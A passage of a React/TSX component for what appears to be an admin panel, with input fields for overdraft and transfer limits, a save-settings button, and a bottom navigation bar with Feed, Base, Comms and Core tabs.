                          value={config?.general?.overdraftLimit || 500}
                          onChange={(e) => setConfig({ ...config, general: { ...config.general, overdraftLimit: parseInt(e.target.value) } })}
                          className="w-full bg-transparent p-2 text-sm text-white focus:outline-none"
                        />
                      </div>
                    </div>
                    <div className="space-y-1">
                      <span className="text-[9px] text-zinc-500 uppercase font-bold tracking-tighter">Transfer Limit</span>
                      <div className="flex items-center bg-black rounded-xl px-3 border border-white/10 focus-within:border-emerald-500/50 transition-colors">
                        <span className="text-zinc-600 text-xs">$</span>
                        <input 
                          type="number" 
                          value={config?.general?.transferLimit || 3000}
                          onChange={(e) => setConfig({ ...config, general: { ...config.general, transferLimit: parseInt(e.target.value) } })}
                          className="w-full bg-transparent p-2 text-sm text-white focus:outline-none"
                        />
                      </div>
                    </div>
                  </div>
                </div>

                <button 
                  onClick={() => handleSaveConfig(config)}
                  disabled={saving}
                  className="w-full bg-white text-black py-4 rounded-2xl text-xs font-black uppercase tracking-widest hover:opacity-90 active:scale-[0.98] transition-all disabled:opacity-50 flex items-center justify-center gap-2 shadow-xl shadow-white/5"
                >
                  <Save size={16} /> {saving ? 'Writing to Disk...' : 'Save All Changes'}
                </button>
              </div>
            </div>
          </div>
        )}
      </div>

      {/* Nav */}
      <div className="bg-zinc-900/80 backdrop-blur-xl border-t border-white/5 p-4 flex justify-between fixed bottom-0 left-0 right-0 z-[2100]">
        {[
          { id: 'live', icon: Activity, label: 'Feed' },
          { id: 'database', icon: Database, label: 'Base' },
          { id: 'mailer', icon: Mail, label: 'Comms' },
          { id: 'settings', icon: Settings, label: 'Core' }
        ].map((item) => (
          <button
            key={item.id}
            onClick={() => setActiveTab(item.id as Tab)}
            className={`flex flex-col items-center gap-1 transition-all ${activeTab === item.id ? 'text-red-500 scale-110' : 'text-zinc-500 opacity-60'}`}
          >
            <item.icon size={22} className={activeTab === item.id ? 'drop-shadow-[0_0_8px_rgba(239,68,68,0.5)]' : ''} />
            <span className="text-[8px] font-black uppercase tracking-widest">{item.label}</span>
          </button>
        ))}
      </div>
    </div>
  );
}
